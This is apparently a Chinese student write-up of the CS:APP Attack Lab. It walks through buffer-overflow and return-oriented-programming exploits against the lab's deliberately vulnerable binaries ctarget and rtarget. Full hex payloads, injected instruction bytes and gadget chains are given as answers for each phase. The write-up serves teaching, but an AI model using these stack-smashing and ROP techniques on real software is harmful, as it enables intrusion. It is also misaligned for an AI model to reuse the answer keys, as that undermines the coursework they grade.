### 写在前面：

这个lab真的很好玩，个人感觉这会比lab2更好玩，并且能学到很多纸上得不到的东西。

建议:

1. 每一个小lab都分文件比较好，这样不容易乱
2. 容易你在做的中途发生了疑惑，**先去看PDF，那里有足够详细的解释和建议**
3. 如果你实在想不到方法，可以参考下我的思路
4. 我大概这个lab花了7个小时甚至更多。
5. 如果逻辑对了，但是答案不对，那么就调试吧 cgdb ../ctarget  之后 run -q < str

### **环境配置**

（建议先建一个文件夹lab3attacklab）执行下面的命令就会下载最新版的lab所有资料，加中文版pdf翻译

```bash
wget https://gitee.com/lin-xi-269/csapplab/raw/origin/lab3attacklab/install.sh && bash install.sh
```

之后target1就是你的工作目录。

### 准备开始

这是栈溢出的根源：getbuf，以后都要用到它，**我们从test1调用，然后ret到别的函数，就是这个lab的目的**

```c
1 unsigned getbuf()
2 {
3 	char buf[BUFFER_SIZE];
4 	Gets(buf);
5 	return 1;
6 }

1 void test()
2 {
3	 int val;
4 	  val = getbuf();
5 	  printf("No exploit. Getbuf returned 0x%x\n", val);
6 }

When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution
within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,
there is code for a function touch1 having the following C representation:

1 void touch1()
2 {
3 	vlevel = 1; /* Part of validation protocol */
4 	printf("Touch1!: You called touch1()\n");
5 	validate(1);
6 	exit(0);
7 }
```

### 4-1

您的任务是让 CTARGET 在 getbuf 执行其 return 语句时执行 touch1 的代码，而不是返回到 test。请注意，
利用字符串还可能损坏与这个阶段没有直接关系的堆栈部分，但这不会造成问题，因为  touch1 会导致程序
直接退出**所以我们让栈溢出之后的第一个位置是touch1的地址，即可ret到touch1**

答案为

```bash
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

cd 4-1之后

```text
../hex2raw < hex  > str &&../ctarget -q < str   
```

即可通过。

### 4.2

我们需要做什么？ 答：和4-1一样ret，只不过**是ret去执行touch2**(touch2.c代码在pdf中有，因为那个c代码不全，我建议还是直接看汇编)，并且还要带上参数，这个参数的值是你的cookie.txt中的值 ，**用rdi传参**

**首先注意此题是非常容易出错的！需要对ret有本质的了解！！**（事实上我搜了几个博主他们都做错了，他们的答案已经不能通过现在（2021/12/26）的测试了）

一种受4.1影响的错误思路，就是直接多加一个ret，代码如下

```c
/* touch2 */
48 c7 c7 fa 97 b9 59  /* mov $0x59b997fa,%rdi */
c3   /* ret */
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00   /* 补齐至40 */
78 dc 61 55 00 00 00 00   /* 去栈底执行 */
ec 17 40 00 00 00 00 00  /* c3执行时 会pop 这个 touch2 */  /* 第一次ret之后的 rsp位置 */
/* 第二次ret 之后rsp 的位置*/
```

大意是：ret两次，第一次到栈底去执行 传参数rdi， 然后再ret，这样我们就可以将cookie带到touch中了，并且成功进入，一切都十分顺利，并成功进入了validate，正当我准备迎接pass的时候，不幸的是：得到的是segmentation fault，并且可以看出我们是成功进入了touch2的且cookie是正确的，**那么说明问题出在validate里面。**

![image-20211227004040517](https://gitee.com/wzjia/picture/raw/master/image-20211227004040517.png)

我搜了很多人的题解，说实话他们基本上和我错的一样....但是他们以前通过了。没办法，只有调试了：cgdb ./ctarget 

接下来我们把断点打在 0x40181d（callq validate 的地方）

run -q < res-C-2.hex 之后一直nexti，最后我们的指针停在了这！，他的意思是这个%rsp这个地址是非法的 ，可是怎么就非法了呢？

![image-20211227004537501](https://gitee.com/wzjia/picture/raw/master/image-20211227004537501.png)

让我们来回忆我们什么时候改过rsp？？或者说这和4-1的rsp有什么不同？（因为4-1我们是成功了的）咦，好像从来没有改过啊？ 谁会改变rsp? 难道是ret?  啊，确实是它！下面是ret的本质：

ret == pop %rax      +     jmp %rax  即 **ret 等价于 (rax = *rsp++, jmp rax)**

所以我们比 4-1 的rsp 多前进了 8个字节，即我们已经超出了16个字节，等等？为什么是超出了16个字节非法，而八个字节就合法呢? 不应该都非法吗？ 哈哈，因为cmu的老师们已经为我们处理好了，每次一进入touch函数，sub   $0x8,%rsp（当时我第一次看到touch1想了半天这语句开了8字节空间，又不用，搁这浪费？哈哈后来才明白老师的用心良苦），所以之后就不会非法啦！~

好！接下来的问题就只剩   "如何让 rsp --"

1. 我们是否可以减少ret数量？ 不行，这样无法设置参数，这路走不通

2. 我们是否即可即入栈又让--rsp ？ 这个好像可以，诶，等等！ 这不就是pushq嘛  ！！

   所以答案改成：

   ```C
   48 c7 c7 fa 97 b9 59 /* mov $0x59b997fa,%rdi */
   68 ec 17 40 00 /*pushq 0x00000000004017ec */
   c3 /* ret */
   00 00 00 00 00 00 00 00 
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00   /* 补齐至40 */
   78 dc 61 55 00 00 00 00  /* 去栈底执行 */
   ```

### 4.3

这一题需要做什么？ 需要传送string的首地址到touch3中，这个string就是cookie的字符串表示

难点在于如何保存 string，并且保证其在传递到rdi时是有效的。

如果我们继续像4-2那样，将string保存在 getbuf的栈中，**是会被覆盖的**，我尝试了别的博主的这种做法，错了，不过是因为segmentation fault，是和4-2一样的错误。 下面是这个被覆盖的提示，来自lab附带的pdf

![image-20211227163215344](https://gitee.com/wzjia/picture/raw/master/image-20211227163215344.png)

我想到了两种方案：

1. 借用4-2的思想，去栈底然后在返回之前将 string放到 0x5561dca0，这样就不会被覆盖了，但是这很麻烦，mov $string,%rax 这条指令我当时是会翻译出换行（导致读入错误），并且我还要保存rax，并且还要回复，这太麻烦了。所以我放弃了这个方案
2. 将string写到test的栈里，这样就很安全了，因为我们的string就可以在rsp的上面，而不会被覆盖，当然这样就覆盖了别的值，不过毕竟我们是攻击者，本来就是来破坏栈的。这个方案也比较好实现。**所以我们就直接到test的栈里面去执行**

直接看答案吧：最后一行的注释是第7行的，因为放在那总是不能通过，所以放下面了。string要翻译为ASCII的形式

``` c
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00  
/* 0x5561dca0 */    b8 dc 61 55 00 00 00 00     /* to 0x5561dcb8 */
/* 0x5561dca8 */    35 39 62 39 39 37 66 61 
/* 0x5561dcb0 */    00 00 00 00 00 00 00 00   
/* 0x5561dcb8 */    48 c7 c7 a8 dc 61 55      /* mov    $0x5561dca8,%rdi */
68 fa 18 40 00     /* pushq  $0x4018fa */ 
c3 00 00 00        /* ret */ 
/* 加多一个0在str末尾， 这里补齐了八个字节，事实上不补齐也可以PASS*
```



### 5-1

进入5之后的需要改变思维：即只有text中的代码可以运行，**是text中的任何位置！！**不过csapp老师实在是用心良苦，他们把这些指令都写在farm.c中了，是一些很巧妙的指令！！ （另外不能用 farm.c去编译然后在反汇编得到farm.d，因为现代的gcc发展太快了，作者介绍的这两种攻击方法在farm.d中都不行了。）**得使用反汇编rtarget的代码。**

这一部分主要是不能在栈中运行代码了，所以我们要想办法利用text中的部分

所以我们的步骤改为：

第一步：pop rax （拿到cookie）

第二步：mov rax，rdi （传递给touch3）

第三步: ret 调用

**答案如下**

```c
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00   /* 补齐至40 */
ab 19 40 00 00 00 00 00  /* popq rax 0x4019ab 0x4019a7 + 4 */
fa 97 b9 59 00 00 00 00  /* cookie 的值 */

a2 19 40 00 00 00 00 00  /* 0x4019a2  movq %rax, %rdi 0x4019a0 + 2 */
ec 17 40 00 00 00 00 00  /* touch2 4017ec */
/* 0x5561dca8 */    35 39 62 39 39 37 66 61  /* str */
/* 0x5561dcb0 */    00 00 00 00 00 00 00 00 

/* 这个地址不行，92这条指令会改变 rax
b9 19 40 00 00 00 00 00  /* popq rax 0x4019b9 0x4019b5 + 4 */
```



### 5 -2

ps：这题需要足够的耐心，当然你会发现我接下来写的思路很顺畅，但是实际上，我专门将那几个函数的汇编代码写到了一个文件[man.s](https://gitee.com/lin-xi-269/csapplab/tree/master/lab3attack/target1/5-2/man.s)中，然后一个一个指令搜，这大概花了我两三个小时，才找完（主要是找加法和注释错误用了很多时间）。

这题和4-3是一样的，主要难点是我们不知道栈地址了，那么如何将string address 传给rdi呢？

我们发现，虽然栈初始地址是变化的，但是相对位置是不会变的，所以**我们应该在某一个时刻，获得rsp的值，并将其加上偏移量得到string address 然后传给rdi**

这样我们就要解决三个问题：

1. 在何时取得rsp？
2. 将rsp放到哪里去？
3. 如何实现加上偏移量这个操作，并传递给rdi？
4. 调用touch3

解决：

1. 在我们越界溢出的那个地方的rsp，在那剩下的操作是可控的，所以我们选择在那获取rsp。

2. 这个得看我们能找到哪些命令了，我找到了mov %rsp,%rax，所以就用这个了

3. 如何执行相加，这个我找了很久很久，也没有找到add的指令，我想尝试or，发现我无法确定它未加，**后来直到看到了lea，很巧的是这正好是add_xy做的事情。**

   当发现这一步之后，我们就顺藤摸瓜（自顶向下，二分击破）: 从lea开始一步步找就可以找到整一个偏移量的过程 。

   这样我们的偏移就存在rsi中了，而rsp就在rdi中了。最后rdi就在rax里了

   ```text
   0x4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   
   a2 19 40 00 00 00 00 00  /* 0x4019a2  movq %rax, %rdi 0x4019a0 + 2 */
   0x401a06    401a03:	8d 87 41 48 89 e0    mov rsp, %rax
   
   
   0x4019ea    4019e8:	8d 87 89 ce      mov ecx, esi	
   0x401a70    401a6e:	c7 07 89 d1      mov edx, ecx
   0x4019dd    4019db:	b8 5c 89 c2      mov eax, edx
   
   ab 19 40 00 00 00 00 00  /* popq rax 0x4019ab 0x4019a7 + 4 */
   /* rsp string 偏移为 32 */ 20 00 00 00 00 00 00 00 
   ```

   接着我们在  movq %rax, %rdi 即可完成传参。

4. 和之前一样touch3地址放到rsp位置上即可

完整答案和解释: (因为注释的原因，这个答案不能成功运行，但是适合阅读)，PASS答案:[hex](https://gitee.com/lin-xi-269/csapplab/tree/master/lab3attack/target1/5-2/5-2/hex)

```c
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00   /* 补齐至40 */

/* 1. 配置 rsi */

ab 19 40 00 00 00 00 00  /* popq rax 0x4019ab 0x4019a7 + 4 */
/* rsp string 偏移为 32 */ 20 00 00 00 00 00 00 00   
 
dd 19 40 00 00 00 00 00  /* mov eax, edx */
70 1a 40 00 00 00 00 00  /* mov edx, ecx */
ea 19 40 00 00 00 00 00  /* mov ecx, esi */

/* 2. 配置 rdi */
06 1a 40 00 00 00 00 00   /* 0x401a06  0x401a03 + 3 mov %rsp,%rax  */ 
/* 从这开始偏移为 0 */ a2 19 40 00 00 00 00 00  /* 0x4019a2  movq %rax, %rdi 0x4019a0 + 2 */

/* 3. 加法运算 将字符串的地址保存进 rax */
d6 19 40 00 00 00 00 00  /* lea    (%rdi,%rsi,1),%rax */

/* 4. 将string address 赋给 rdi */
a2 19 40 00 00 00 00 00  /* 0x4019a2  movq %rax, %rdi 0x4019a0 + 2 */

/* 5. 调用touch3 */
fa 18 40 00 00 00 00 00   /* 0x4018fa touch3 */ 

/* 32 */    35 39 62 39 39 37 66 61 
/* 末尾0 */    00 00 00 00 00 00 00 00   
```

 

### 总结

通过这个实验我确实了解了两种攻击方法，不过从我目前从gcc得到的代码来看，给rdi赋值是一件十分困难的事了，不过这两种方法都给了我很大的启发，特别是第二种，**我才真正意识到CPU就是傻子，只会取值执行** 的真正意义，另外也更加了解指令编码了，说实话拆开一段指令来执行真的让我很震撼！！并且这真的可行！！ Good luck and have fun!



### 结果

我是自己写了一个脚本test.sh， 把答案放在每一个小test/hex里面，可以看到全部都通过了！

![image-20211228163111152](https://gitee.com/wzjia/picture/raw/master/image-20211228163111152.png)



 [gitee 仓库](https://gitee.com/lin-xi-269/csapplab/tree/master/)

